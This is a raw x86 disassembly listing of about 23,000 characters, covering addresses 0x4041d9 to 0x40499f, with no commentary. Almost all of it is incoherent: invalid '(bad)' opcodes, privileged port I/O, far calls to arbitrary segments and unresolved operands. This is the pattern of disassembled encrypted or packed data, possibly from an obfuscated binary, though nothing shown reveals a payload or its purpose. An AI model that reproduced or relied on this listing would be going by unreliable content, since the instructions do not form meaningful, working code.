  4041d9:	imul   eax,esp,0x24
  4041dc:	xor    DWORD PTR [esi-0x1b2a05da],esp
  4041e2:	add    BYTE PTR [edi-0x5c],ch
  4041e5:	test   eax,0xac4532fe
  4041ea:	stos   BYTE PTR es:[edi],al
  4041eb:	inc    ebx
  4041ec:	rcl    DWORD PTR [edx-0x72],0xf7
  4041f0:	cmp    eax,ecx
  4041f2:	add    edi,ebp
  4041f4:	pusha  
  4041f5:	lods   al,BYTE PTR ds:[esi]
  4041f6:	stos   DWORD PTR es:[edi],eax
  4041f7:	cmp    al,0xfb
  4041f9:	(bad)  
  4041fa:	div    DWORD PTR [esi+0x1c]
  4041fd:	pop    ebp
  4041fe:	ins    BYTE PTR es:[edi],dx
  4041ff:	ins    DWORD PTR es:[edi],dx
  404200:	mov    DWORD PTR [ecx+ebx*1],ebx
  404203:	or     al,bl
  404205:	jge    0x404285
  404207:	int3   
  404208:	inc    ebx
  404209:	mov    dh,0xa4
  40420b:	mov    edi,DWORD PTR [ebx+0x3d55266f]
  404211:	sub    eax,0x97afe656
  404216:	jge    0x40428a
  404218:	push   esi
  404219:	mov    al,ds:0x85a7b7d8
  40421e:	dec    ebx
  40421f:	dec    esi
  404220:	mov    ecx,0x6c6eb2f0
  404225:	adc    edx,DWORD PTR [eax+edi*2-0x39caa7d3]
  40422c:	sub    bl,al
  40422e:	cmp    ebx,0x64149ef2
  404234:	and    eax,0x2e2ec802
  404239:	sbb    cl,BYTE PTR [ecx-0x7b01fe9d]
  40423f:	push   ebx
  404240:	imul   ebp,DWORD PTR [ebx+ebp*8-0x3f],0xfffffffd
  404245:	push   edi
  404246:	lods   al,BYTE PTR ds:[esi]
  404247:	xchg   esi,eax
  404248:	fisubr DWORD PTR [edx+ebp*8+0x30a95882]
  40424f:	cs inc ecx
  404251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404252:	scas   al,BYTE PTR es:[edi]
  404253:	sub    BYTE PTR [ebx+0x31],cl
  404256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404257:	mov    cl,0xc5
  404259:	cmp    dh,BYTE PTR [eax+0x1b]
  40425c:	hlt    
  40425d:	lock and BYTE PTR [edi-0x23],bl
  404261:	out    0xa6,eax
  404263:	fsubr  QWORD PTR [ebp+0x7d]
  404266:	sbb    BYTE PTR [ecx-0x5b],bh
  404269:	push   ebp
  40426a:	popf   
  40426b:	dec    ebx
  40426c:	add    ebx,DWORD PTR [edx+0x32f50d2b]
  404272:	inc    DWORD PTR [ebx+edx*8+0x48]
  404276:	div    BYTE PTR [ebp-0x1b]
  404279:	(bad)  
  40427a:	hlt    
  40427b:	ins    BYTE PTR es:[edi],dx
  40427c:	inc    edx
  40427d:	retf   0x22c2
  404280:	xchg   BYTE PTR [ebx],ah
  404282:	adc    bl,BYTE PTR [ecx+0x61]
  404285:	fild   QWORD PTR [eax+ebp*1]
  404288:	leave  
  404289:	test   eax,0xcebac265
  40428e:	dec    edi
  40428f:	stc    
  404290:	mov    bh,0x37
  404292:	xor    BYTE PTR [edx-0x593f66d1],bh
  404298:	shl    DWORD PTR [edx],cl
  40429a:	shl    DWORD PTR [ebx],cl
  40429c:	je     0x404276
  40429e:	and    BYTE PTR [esi],dh
  4042a0:	sub    al,0x7f
  4042a2:	push   cs
  4042a3:	mov    edi,0xb18163a4
  4042a8:	jns    0x4042b2
  4042aa:	dec    eax
  4042ab:	sbb    ecx,DWORD PTR [eax+0x61afd477]
  4042b1:	push   0xded6843
  4042b6:	in     eax,dx
  4042b7:	adc    esp,DWORD PTR [ebx+ebp*1+0x1b05f7eb]
  4042be:	xor    esp,edi
  4042c0:	test   al,0x77
  4042c2:	in     al,0x94
  4042c4:	push   0xffffffe0
  4042c6:	gs scas eax,DWORD PTR es:[edi]
  4042c8:	int3   
  4042c9:	jb     0x40427d
  4042cb:	xchg   ebp,eax
  4042cc:	rcr    BYTE PTR [edx+0x5b],cl
  4042cf:	fs stos DWORD PTR es:[edi],eax
  4042d1:	retf   0x1599
  4042d4:	xor    al,0x78
  4042d6:	pop    ds
  4042d7:	xchg   esp,eax
  4042d8:	in     eax,dx
  4042d9:	ins    BYTE PTR es:[edi],dx
  4042da:	ret    0x716a
  4042dd:	inc    esp
  4042de:	push   eax
  4042df:	sub    al,0x7f
  4042e1:	jle    0x4042dd
  4042e3:	mov    esp,0x2ac616ff
  4042e8:	jns    0x40430b
  4042ea:	lahf   
  4042eb:	cmc    
  4042ec:	or     esp,edi
  4042ee:	nop
  4042ef:	ss or  bh,BYTE PTR ds:[ebx+0x1e]
  4042f4:	ret    
  4042f5:	add    BYTE PTR [esi+0x2a],0xab
  4042f9:	rcr    DWORD PTR [eax+esi*4],1
  4042fc:	pop    edx
  4042fd:	jmp    0x65e57c66
  404302:	scas   eax,DWORD PTR es:[edi]
  404303:	call   0x625e:0xf0a557b4
  40430a:	mov    dl,0x1d
  40430c:	dec    edx
  40430d:	push   cs
  40430e:	pop    ebp
  40430f:	pop    ecx
  404310:	adc    eax,0x7081dc6f
  404315:	icebp  
  404316:	leave  
  404317:	sub    ebx,DWORD PTR [edx+0x1b]
  40431a:	clc    
  40431b:	lahf   
  40431c:	sbb    DWORD PTR [edi],edx
  40431e:	and    eax,0x55416589
  404323:	rol    BYTE PTR [edi+0x64],cl
  404326:	push   edi
  404327:	sub    eax,0x5cc2a0ec
  40432c:	adc    al,0x39
  40432e:	mov    dl,0xac
  404330:	mov    al,0x4e
  404332:	cmp    al,0xd2
  404334:	mov    DWORD PTR [esi+0x2bc105b2],esp
  40433a:	popf   
  40433b:	outs   dx,BYTE PTR ds:[esi]
  40433c:	lock in al,0x64
  40433f:	out    dx,eax
  404340:	popa   
  404341:	pop    ss
  404342:	push   es
  404343:	(bad)  
  404345:	xchg   esi,eax
  404346:	sub    al,0x43
  404348:	call   0xb4b5ade3
  40434d:	mov    ah,0xf2
  40434f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404351:	mov    dh,0xf7
  404353:	pop    ebp
  404354:	ror    BYTE PTR [eax],0x54
  404357:	pop    ebx
  404358:	dec    esp
  404359:	mov    WORD PTR [edi-0x25],ss
  40435c:	push   es
  40435d:	inc    ebp
  40435e:	dec    edx
  40435f:	int3   
  404360:	stos   DWORD PTR es:[edi],eax
  404361:	inc    eax
  404362:	aad    0xf5
  404364:	mov    ah,0x12
  404366:	outs   dx,DWORD PTR ds:[esi]
  404367:	adc    BYTE PTR [edx],0xc
  40436a:	mov    bl,0xed
  40436c:	adc    eax,0x789a5f94
  404371:	gs mov bh,0xc9
  404374:	lods   eax,DWORD PTR ds:[esi]
  404375:	xor    ah,BYTE PTR [esi]
  404377:	ins    BYTE PTR es:[edi],dx
  404378:	inc    esi
  404379:	cmp    eax,DWORD PTR [esi]
  40437b:	scas   al,BYTE PTR es:[edi]
  40437c:	jp     0x40430a
  40437e:	sbb    bl,bh
  404380:	and    BYTE PTR [ecx+ebp*1+0x1643f95c],bh
  404387:	aas    
  404388:	out    0x71,al
  40438a:	ins    BYTE PTR es:[edi],dx
  40438b:	mov    ebp,DWORD PTR [edi-0x39f74527]
  404391:	cs xchg edi,eax
  404393:	dec    ebx
  404394:	ins    BYTE PTR es:[edi],dx
  404395:	xor    dl,BYTE PTR [edx-0x1d]
  404398:	ror    BYTE PTR [ecx+0x6e],0xd6
  40439c:	in     eax,0x35
  40439e:	sbb    esi,edx
  4043a0:	sbb    DWORD PTR [ecx+0x7cb9faec],ecx
  4043a6:	mov    WORD PTR [ebx+0x28],ss
  4043a9:	(bad)  
  4043aa:	cmp    DWORD PTR [esi-0x41],eax
  4043ad:	adc    eax,0x9cce9bfc
  4043b2:	adc    eax,0x74842e3a
  4043b7:	scas   al,BYTE PTR es:[edi]
  4043b8:	(bad)  
  4043b9:	adc    esi,esp
  4043bb:	(bad)  
  4043bc:	lods   eax,DWORD PTR ds:[esi]
  4043bd:	inc    edi
  4043be:	std    
  4043bf:	js     0x4043e5
  4043c1:	cmp    ebp,esi
  4043c3:	ins    BYTE PTR es:[edi],dx
  4043c4:	and    BYTE PTR [esi],al
  4043c6:	mov    ds:0x47ad5783,eax
  4043cb:	fistp  DWORD PTR [ecx]
  4043cd:	sbb    eax,0x6b87a56d
  4043d2:	push   0xffffffc0
  4043d4:	nop
  4043d5:	data16 (bad) 
  4043d8:	dec    esp
  4043d9:	std    
  4043da:	mov    dh,0xf2
  4043dc:	add    edi,DWORD PTR [ebx]
  4043de:	ins    BYTE PTR es:[edi],dx
  4043df:	daa    
  4043e0:	adc    BYTE PTR [ecx],ah
  4043e2:	pushf  
  4043e3:	je     0x4043b3
  4043e5:	add    DWORD PTR [esi-0x46],edx
  4043e8:	mov    dh,0x23
  4043ea:	push   0xcc429cbb
  4043ef:	jbe    0x4043d8
  4043f1:	ins    DWORD PTR es:[edi],dx
  4043f2:	pop    esp
  4043f3:	out    0x9f,eax
  4043f5:	fiadd  DWORD PTR ds:0xa6802cc3
  4043fb:	out    dx,al
  4043fc:	pop    ecx
  4043fd:	mov    esp,0x66d70cd0
  404402:	cmp    ah,BYTE PTR [edx]
  404404:	adc    edi,ebx
  404406:	mov    cl,0x5d
  404408:	scas   eax,DWORD PTR es:[edi]
  404409:	fild   QWORD PTR [eax]
  40440b:	xchg   ebp,eax
  40440c:	das    
  40440d:	(bad)  
  40440e:	hlt    
  40440f:	xchg   ecx,eax
  404410:	sub    al,0x24
  404412:	pop    esp
  404413:	mov    ds:0x1de11837,eax
  404418:	push   ds
  404419:	jo     0x404432
  40441b:	enter  0x61cd,0x6f
  40441f:	mov    bh,0x46
  404421:	loop   0x4043f6
  404423:	sbb    al,0x52
  404425:	iret   
  404426:	mov    bh,0x5c
  404428:	into   
  404429:	or     DWORD PTR [edx-0xd3a6ec3],esp
  40442f:	shl    BYTE PTR [edx+0x5],0xee
  404433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404434:	nop    DWORD PTR [ebx]
  404437:	and    al,0xe3
  404439:	ja     0x404439
  40443b:	add    DWORD PTR [ebp+0x6c],ebp
  40443e:	adc    eax,0x77404b3a
  404443:	sub    eax,edi
  404445:	or     DWORD PTR [edi-0x76],ebx
  404448:	mov    ?,WORD PTR [esi+0x3a06fa7f]
  40444e:	mov    ebp,0xc2f78fcc
  404453:	add    ecx,edi
  404455:	push   esp
  404456:	rcl    bh,0x39
  404459:	add    BYTE PTR [ebp-0x3f],0x9f
  40445d:	gs out dx,al
  40445f:	jno    0x4043f7
  404461:	and    eax,0x7c3b1e3d
  404466:	jne    0x4043e9
  404468:	mov    DWORD PTR [eax+0x42099500],edi
  40446e:	adc    BYTE PTR [esi-0x2a],dl
  404471:	sub    BYTE PTR [eax-0x3],ch
  404474:	in     al,0x8f
  404476:	retf   
  404477:	not    BYTE PTR [ebp+0x33aafdd4]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044a9
  404490:	adc    ebp,DWORD PTR [ebp+0x7e185ecc]
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x40446b
  40449c:	in     al,dx
  40449d:	pop    edx
  40449e:	leave  
  40449f:	pop    ebx
  4044a0:	dec    eax
  4044a1:	push   0x1f
  4044a3:	mov    ebp,0xc97478b5
  4044a8:	pop    ebx
  4044a9:	mov    WORD PTR [eax],?
  4044ab:	push   ebp
  4044ad:	lahf   
  4044ae:	adc    DWORD PTR [ebx+0x4a],esi
  4044b1:	and    edx,DWORD PTR [edi]
  4044b3:	jnp    0x4044e4
  4044b5:	fiadd  DWORD PTR [ebx]
  4044b7:	int3   
  4044b8:	push   cs
  4044b9:	(bad)  
  4044ba:	xchg   edi,eax
  4044bb:	push   edi
  4044bc:	ret    
  4044bd:	fdivr  st,st(3)
  4044bf:	dec    esp
  4044c0:	add    DWORD PTR [eax+ecx*4-0x7d8a1acb],edi
  4044c7:	sbb    ecx,DWORD PTR [esi+0x56]
  4044ca:	enter  0xb5d,0x6
  4044ce:	cmp    eax,0x39665c8d
  4044d3:	std    
  4044d4:	in     al,dx
  4044d5:	mov    eax,0x5d1044de
  4044da:	pop    edi
  4044db:	pop    bx
  4044dd:	mov    bh,0x6d
  4044df:	adc    BYTE PTR [ebp-0x3e40d1f1],dh
  4044e5:	xor    BYTE PTR [edx+ebp*1-0x3556b99d],dh
  4044ec:	sub    DWORD PTR [ebx-0x5b],edx
  4044ef:	jo     0x404552
  4044f1:	aad    0xe9
  4044f3:	jne    0x404537
  4044f5:	neg    DWORD PTR [ebx]
  4044f7:	mov    edx,0x2b16f0e1
  4044fc:	xchg   ebx,eax
  4044fd:	stc    
  4044fe:	push   eax
  4044ff:	div    DWORD PTR [ebp+0x653c3398]
  404505:	test   eax,0x97e75eb
  40450a:	add    DWORD PTR [ebp-0x9d761bb],esi
  404510:	and    edi,DWORD PTR [ebp*2-0x7d04b2d3]
  404517:	mov    edi,0x200aeef3
  40451c:	jae    0x404557
  40451e:	call   0xe7aa:0x4f5dbc93
  404525:	jne    0x4044ff
  404527:	imul   esi,DWORD PTR [ecx+0x245019f6],0xffffffc8
  40452e:	xchg   esi,eax
  40452f:	xor    al,0xa2
  404531:	lahf   
  404532:	int    0xb8
  404534:	imul   esp,DWORD PTR [esi+0x792290a6],0xffffffe2
  40453b:	mov    eax,0x48642981
  404540:	and    bh,BYTE PTR [ebx]
  404542:	add    eax,0x64302a92
  404547:	fs xchg esi,eax
  404549:	mov    ecx,0xef447d10
  40454e:	fidivr DWORD PTR [edi]
  404550:	(bad)  
  404551:	loope  0x4044ee
  404553:	(bad)  
  404555:	inc    ebx
  404556:	sbb    eax,DWORD PTR [ecx+0x7636cdce]
  40455c:	cld    
  40455d:	ins    BYTE PTR es:[edi],dx
  40455e:	mov    ebp,0x95a42957
  404563:	sub    cl,BYTE PTR [eax]
  404565:	adc    eax,0x133299a9
  40456a:	out    0x63,al
  40456c:	mov    esp,0xb06e6838
  404571:	scas   al,BYTE PTR es:[edi]
  404572:	dec    esp
  404573:	mov    eax,ds:0x74d19641
  404578:	out    dx,al
  404579:	sti    
  40457a:	jae    0x4045fa
  40457c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40457d:	xchg   esp,eax
  40457e:	sub    al,0x8e
  404580:	xchg   ebp,eax
  404581:	add    eax,0x9fbc858d
  404586:	push   eax
  404587:	and    eax,0x79310e5c
  40458c:	cmp    BYTE PTR [edi-0x2e],ch
  40458f:	or     eax,0x15a04e45
  404594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404595:	ja     0x404584
  404597:	fcom   QWORD PTR [ebx-0x32c985bc]
  40459d:	arpl   WORD PTR [ebx-0x49],di
  4045a0:	cli    
  4045a1:	(bad)  
  4045a2:	mov    ebx,0x7ead5754
  4045a7:	ds push edi
  4045a9:	sahf   
  4045aa:	repz in eax,0xe2
  4045ad:	pop    ecx
  4045ae:	dec    DWORD PTR [edi]
  4045b0:	and    esi,DWORD PTR [edi-0x5c]
  4045b3:	xor    DWORD PTR [ebp+0x60e223db],ebp
  4045b9:	xchg   edi,eax
  4045ba:	mov    eax,ds:0x958c8336
  4045bf:	mov    bh,0xec
  4045c1:	out    dx,eax
  4045c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c3:	mov    ?,WORD PTR [ecx+0x4543e583]
  4045c9:	jb     0x4045ba
  4045cb:	mov    edi,0x1539de95
  4045d0:	push   ebx
  4045d1:	lahf   
  4045d2:	outs   dx,DWORD PTR ds:[esi]
  4045d3:	jb     0x4045c6
  4045d5:	inc    edx
  4045d6:	pop    ebp
  4045d7:	mov    dl,BYTE PTR [ebx-0x22983a8a]
  4045dd:	or     dh,BYTE PTR [edi-0x5b]
  4045e0:	daa    
  4045e1:	mov    bh,0x42
  4045e3:	pop    esi
  4045e4:	mov    ebx,0x1cf8bbd7
  4045e9:	mov    ebp,0xf4024401
  4045ee:	enter  0x87e,0x29
  4045f2:	aas    
  4045f3:	add    BYTE PTR [ecx+0x78],bl
  4045f6:	mov    cl,0x3f
  4045f8:	xor    ebx,edx
  4045fa:	lahf   
  4045fb:	mov    es,WORD PTR [ebp+0x3a]
  4045fe:	js     0x404632
  404600:	cmp    eax,0x79a49630
  404605:	das    
  404606:	rol    DWORD PTR [esi],1
  404608:	call   0x9847:0xd2c04b9b
  40460f:	pop    ebp
  404610:	mov    eax,ds:0x152c7f2b
  404615:	dec    edx
  404616:	add    eax,0x844ec7c6
  40461b:	retf   0xf261
  40461e:	mov    bl,0x87
  404620:	push   esp
  404621:	popa   
  404622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404623:	xor    esp,edi
  404625:	fisttp WORD PTR [esp+edi*2]
  404628:	ret    
  404629:	outs   dx,BYTE PTR ds:[esi]
  40462a:	ds or  al,0x1c
  40462d:	push   eax
  40462e:	test   DWORD PTR [eax+0x2c2fac02],edx
  404634:	sub    eax,0xe8795955
  404639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40463a:	add    eax,0x872b1115
  40463f:	jp     0x4046bd
  404641:	adc    DWORD PTR [ebp-0x69d6a0c9],0xf3d689ee
  40464b:	hlt    
  40464c:	sbb    edx,DWORD PTR [ebx]
  40464e:	mov    edi,0x18d95dc0
  404653:	icebp  
  404654:	sbb    al,0xd2
  404656:	sub    al,0xb9
  404658:	repnz cmp al,0xc9
  40465b:	mov    ds:0xc38dbdf3,al
  404660:	jne    0x404686
  404662:	sahf   
  404663:	retf   
  404664:	scas   al,BYTE PTR es:[edi]
  404665:	sub    esp,ecx
  404667:	mov    BYTE PTR [ebx],ch
  404669:	inc    esp
  40466a:	(bad)  
  40466c:	popf   
  40466d:	jbe    0x40465a
  40466f:	cmp    BYTE PTR ds:[ebx-0x3],bl
  404673:	aad    0xa8
  404675:	int    0xeb
  404677:	and    eax,0x830edfbb
  40467c:	cmp    DWORD PTR [ebp-0x23],edx
  40467f:	(bad)
  404683:	pop    ds
  404684:	pminsw mm1,QWORD PTR ds:0xc82c2d30
  40468b:	mov    ebp,0x7b37f06f
  404690:	push   ss
  404691:	arpl   WORD PTR [esi+0x2c],dx
  404694:	adc    cl,BYTE PTR [ebp+0x278082be]
  40469a:	call   DWORD PTR [edi]
  40469c:	or     bh,BYTE PTR [ecx-0x1bef6d35]
  4046a2:	(bad)
  4046a5:	sahf   
  4046a6:	cmc    
  4046a7:	and    ecx,esp
  4046a9:	or     edx,DWORD PTR [edx+0x59]
  4046ac:	ficomp WORD PTR [edx]
  4046ae:	or     edi,DWORD PTR [ebx-0x351fda27]
  4046b4:	(bad)  
  4046b5:	and    cl,dh
  4046b7:	icebp  
  4046b8:	pop    edi
  4046b9:	aam    0x75
  4046bb:	repz jecxz 0x404695
  4046be:	push   ebp
  4046c0:	jge    0x4046cb
  4046c2:	ds cmp cl,bl
  4046c5:	pop    eax
  4046c6:	out    0xfa,eax
  4046c8:	and    esi,edi
  4046ca:	xchg   esi,eax
  4046cb:	xchg   esi,eax
  4046cc:	scas   eax,DWORD PTR es:[edi]
  4046cd:	clc    
  4046ce:	dec    edi
  4046cf:	scas   al,BYTE PTR es:[edi]
  4046d0:	(bad)  
  4046d1:	scas   eax,DWORD PTR es:[edi]
  4046d2:	les    edi,FWORD PTR [ebx]
  4046d4:	sbb    BYTE PTR [ebx+0x34],ah
  4046d7:	lock and BYTE PTR [edi-0x6c],dl
  4046db:	repz call 0x98a1:0x2b01f6c5
  4046e3:	cmp    al,0xbe
  4046e5:	xor    eax,ebx
  4046e7:	jle    0x4046ff
  4046e9:	sub    eax,0x2e3fb004
  4046ee:	jbe    0x404765
  4046f0:	or     ch,BYTE PTR [ebp+0x4e]
  4046f3:	inc    esp
  4046f4:	adc    eax,0x6cd79eb9
  4046f9:	in     al,0x10
  4046fb:	enter  0x9f52,0x6b
  4046ff:	hlt    
  404700:	rcr    ebx,cl
  404702:	mov    edi,0xf2b9190e
  404707:	fdivr  QWORD PTR [edi+0x241d95f4]
  40470d:	sbb    DWORD PTR [ebx+edi*8-0x7d1ff601],edi
  404714:	rcl    DWORD PTR [eax-0x2b],1
  404717:	mov    bh,0x81
  404719:	or     BYTE PTR [edi+0x5ffddbe1],ah
  40471f:	push   0xe9c12cdb
  404724:	mov    ecx,0xa27cdc0b
  404729:	leave  
  40472a:	into   
  40472b:	stc    
  40472c:	test   ebp,eax
  40472e:	loopne 0x4046e6
  404730:	and    eax,0x64d0d92
  404735:	dec    edi
  404736:	push   0xa606276f
  40473b:	ins    DWORD PTR es:[edi],dx
  40473c:	pop    eax
  40473d:	adc    ebx,DWORD PTR [esi+0x6d]
  404740:	mov    ch,0xd4
  404742:	lods   eax,DWORD PTR ds:[esi]
  404743:	push   ecx
  404744:	adc    eax,0xe89726e4
  404749:	std    
  40474a:	mov    ebx,0xb388a573
  40474f:	adc    BYTE PTR [edi-0x27],ch
  404752:	jae    0x4047aa
  404754:	ins    BYTE PTR es:[edi],dx
  404755:	xchg   ecx,eax
  404756:	(bad)  
  404757:	mov    esi,0x837e3286
  40475c:	mov    ecx,0x8e42f8a
  404761:	mov    eax,0xec9ac607
  404766:	push   ss
  404767:	inc    ebx
  404768:	loop   0x404762
  40476a:	jg     0x40479d
  40476c:	out    0x25,eax
  40476e:	jnp    0x404700
  404770:	cmp    ch,BYTE PTR [edi+0x21]
  404773:	ja     0x4047eb
  404775:	mov    esp,0x68abbacc
  40477a:	int    0x43
  40477c:	lea    esi,[ecx+0x43]
  40477f:	(bad)  
  404780:	mov    eax,0xf903d033
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	adc    bh,BYTE PTR [edx*1+0x7e27b817]
  4047bb:	jle    0x404815
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047a2
  4047c1:	cli    
  4047c2:	add    al,0x2d
  4047c4:	adc    al,0xda
  4047c6:	push   ss
  4047c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c8:	inc    ebx
  4047c9:	sar    dl,cl
  4047cb:	mov    ch,0x36
  4047cd:	sbb    eax,0xf6d3944
  4047d2:	outs   dx,BYTE PTR ds:[esi]
  4047d3:	cmp    eax,0x50b7be74
  4047d8:	mov    al,ds:0xa841b4fa
  4047dd:	lea    esi,[ecx-0x1622b081]
  4047e3:	and    esi,DWORD PTR [edx+0x4799a11b]
  4047e9:	sbb    ecx,ecx
  4047eb:	mov    ds:0xd79ed30d,al
  4047f0:	shl    cl,1
  4047f2:	jno    0x40478e
  4047f4:	add    BYTE PTR [edx+edi*8+0x1],dl
  4047f8:	mov    bl,0xcc
  4047fa:	xor    eax,0xc7ee7aa6
  4047ff:	adc    eax,0xeb4ad599
  404804:	popf   
  404805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404806:	adc    eax,edi
  404808:	adc    esi,DWORD PTR [ecx+0x0]
  40480b:	psadbw mm5,QWORD PTR [eax-0x58]
  40480f:	loope  0x4047a9
  404811:	call   0x24c1:0xc40003a6
  404818:	sub    DWORD PTR [edx+0x60],esi
  40481b:	adc    DWORD PTR [edi-0x61406f05],ecx
  404821:	or     al,BYTE PTR [ebx-0x2640738e]
  404827:	lods   al,BYTE PTR ds:[esi]
  404828:	repz or DWORD PTR [ebx+0x53],edi
  40482c:	push   esp
  40482d:	inc    ebx
  40482e:	gs or  eax,0xf4c92987
  404834:	jns    0x40486e
  404836:	push   es
  404837:	les    eax,FWORD PTR [edi-0x12]
  40483a:	add    esp,DWORD PTR [esi]
  40483c:	ja     0x4048ae
  40483e:	pop    esi
  40483f:	aas    
  404840:	inc    ecx
  404841:	shl    BYTE PTR [ebp-0x33],cl
  404844:	push   esi
  404845:	js     0x40480a
  404847:	push   0xda6fa810
  40484c:	cmp    ebx,0xffffffbd
  40484f:	icebp  
  404850:	ins    DWORD PTR es:[edi],dx
  404851:	lahf   
  404852:	add    al,0x19
  404854:	and    edi,DWORD PTR [ebx]
  404856:	aad    0x4e
  404858:	adc    DWORD PTR [edi+ebp*2-0x45],edi
  40485c:	jno    0x4048aa
  40485e:	stos   DWORD PTR es:[edi],eax
  40485f:	rcl    dl,1
  404861:	pushfw 
  404863:	lahf   
  404864:	or     ah,ah
  404866:	aam    0xbb
  404868:	rol    eax,cl
  40486a:	xor    ah,dl
  40486c:	popf   
  40486d:	mov    edi,0xfe2150a3
  404872:	pop    esp
  404873:	stc    
  404874:	das    
  404875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404876:	jp     0x40483e
  404878:	psubusw mm5,QWORD PTR [eax-0x6d]
  40487c:	mov    eax,0x7571694d
  404881:	rcr    BYTE PTR [ebx],cl
  404883:	dec    esp
  404884:	sar    BYTE PTR [ebp+0x1b246991],1
  40488a:	rcr    DWORD PTR [edx-0x5e],1
  40488d:	scas   al,BYTE PTR es:[edi]
  40488e:	es push ds
  404890:	lds    edx,FWORD PTR [ebx-0x3b]
  404893:	jmp    0x404840
  404895:	xor    ch,bl
  404897:	call   0x37bc:0x3f2a2552
  40489e:	pop    ecx
  40489f:	clc    
  4048a0:	sbb    BYTE PTR [ecx-0x20],bl
  4048a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048a4:	xchg   esi,eax
  4048a5:	ret    
  4048a6:	retw   0x11e3
  4048aa:	dec    ebp
  4048ab:	pop    ebp
  4048ac:	fmul   st(3),st
  4048ae:	adc    BYTE PTR [edx+0x64],bl
  4048b1:	inc    edi
  4048b2:	mov    al,0x41
  4048b4:	mov    ah,0x2
  4048b6:	mov    ds:0xa6f65434,eax
  4048bb:	dec    esi
  4048bc:	in     al,dx
  4048bd:	cdq    
  4048be:	jp     0x4048e7
  4048c0:	icebp  
  4048c1:	shl    BYTE PTR [esi+0x4],cl
  4048c4:	pop    ebp
  4048c5:	sub    ecx,DWORD PTR ds:0x2d9c4be4
  4048cb:	lock sbb esi,DWORD PTR [edi-0x7805c875]
  4048d2:	fistp  QWORD PTR [edi+0x75]
  4048d5:	je     0x4048cb
  4048d7:	adc    ecx,DWORD PTR [eax]
  4048d9:	sbb    eax,0x58e69e3f
  4048de:	push   es
  4048df:	call   0x6d27aec6
  4048e4:	(bad)  
  4048e5:	pushf  
  4048e6:	xchg   edx,eax
  4048e7:	mov    al,ds:0xccf4d0ed
  4048ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ed:	in     al,0x93
  4048ef:	mov    al,ds:0x6d8a1665
  4048f4:	and    eax,0x7c1102c4
  4048f9:	lock mov esp,0x57db86d5
  4048ff:	mov    ebp,0x238b2953
  404904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404905:	push   cs
  404906:	sbb    dl,BYTE PTR [esi-0x28]
  404909:	dec    eax
  40490a:	mov    bl,BYTE PTR [edx]
  40490c:	mov    WORD PTR [esi+ebp*8+0x38],cs
  404910:	jb     0x4048cb
  404912:	(bad)  
  404913:	outs   dx,DWORD PTR ds:[esi]
  404914:	inc    edi
  404915:	jnp    0x404939
  404917:	inc    ebx
  404918:	scas   al,BYTE PTR es:[edi]
  404919:	mov    cl,0xb4
  40491b:	push   edi
  40491c:	lock ret 
  40491e:	fwait
  40491f:	nop
  404920:	leave  
  404921:	(bad)  
  404923:	mov    esi,0x381c39fe
  404928:	jg     0x404995
  40492a:	xchg   esi,eax
  40492b:	sbb    BYTE PTR [ecx-0x3e8ee789],ch
  404931:	sti    
  404932:	enter  0xab6,0xba
  404936:	dec    ecx
  404937:	push   esi
  404938:	push   ds
  404939:	or     dl,al
  40493b:	jecxz  0x4048df
  40493d:	cli    
  40493e:	outs   dx,BYTE PTR ds:[esi]
  40493f:	out    0xd1,eax
  404941:	mov    bh,0x26
  404943:	iret   
  404944:	mov    ah,0xfa
  404946:	xchg   edi,eax
  404947:	daa    
  404948:	sub    al,0x90
  40494a:	mov    ds:0xcf8bef26,al
  40494f:	adc    ecx,DWORD PTR [edx]
  404951:	push   0x77a82ee2
  404956:	lods   eax,DWORD PTR ds:[esi]
  404957:	aad    0xb3
  404959:	jbe    0x404960
  40495b:	pop    esi
  40495c:	jno    0x4048eb
  40495e:	sti    
  40495f:	sub    DWORD PTR [edi-0x6d],eax
  404962:	inc    edi
  404963:	and    ch,BYTE PTR [ebx-0x5b]
  404966:	aam    0xc
  404968:	(bad)  [esi+0x1031fb00]
  40496e:	xchg   edx,eax
  40496f:	or     BYTE PTR [esi-0x6deaf1d1],0x2
  404976:	dec    edi
  404977:	test   eax,0x30a4b2f5
  40497c:	jmp    0x8ea506c8
  404981:	jb     0x4049a0
  404983:	sbb    eax,0x1e7f48d7
  404988:	mov    al,BYTE PTR [esi]
  40498a:	cld    
  40498b:	sub    DWORD PTR [ecx+0x5ade1e12],ebp
  404991:	iret   
  404992:	mov    WORD PTR [esi],es
  404994:	popa   
  404995:	push   esp
  404996:	push   0x664c0e17
  40499b:	ja     0x404990
  40499d:	jle    0x4049f9
  40499f:	jl     0x4049a2
